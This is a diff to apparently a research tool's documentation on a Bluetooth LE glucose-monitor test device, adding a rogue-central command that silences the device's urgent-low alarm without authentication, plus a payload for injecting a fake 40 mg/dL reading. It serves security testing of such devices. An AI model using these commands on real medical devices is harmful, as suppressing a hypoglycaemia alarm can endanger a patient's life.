@@ -72,6 +72,19 @@ Commands: 0x01 PING, 0x10 AUTH, 0x20 ALARM_SET, 0x30 STATUS, 0x40 TELEMETRY
 STATUS (0x30) payload: `[0:2] glucose u16be | [2] alarm active | [3] authenticated | [4:8] fw version`
 Demo inject payload: `0028010101000001` = 40 mg/dL, URGENT LOW
 
+Rogue central (`brat drive`) — attacks the real device rather than the client.
+Send a read-back before and after a state-changing command and BRAT proves the
+change from the device's own replies:
+
+```bash
+sudo python3 -m brat drive -p glucosense_open --adapter hci0 \
+    -a E5:E2:89:A3:8D:F1 --send 30 --send 20:00 --send 30 --wait 1.5 --confirm
+```
+
+Verified on v1: silences the alarm (`byte 2: 01 -> 00`) while glucose stays at
+0x0028 = 40 mg/dL, with the device's own `authenticated` byte reading `00`
+throughout. LED1 physically goes out. `--send 20:01` reverses it.
+
 Profile: `profiles/glucosense_open.yaml` (5 emulation rules, full protocol block)
 
 ### Known traps
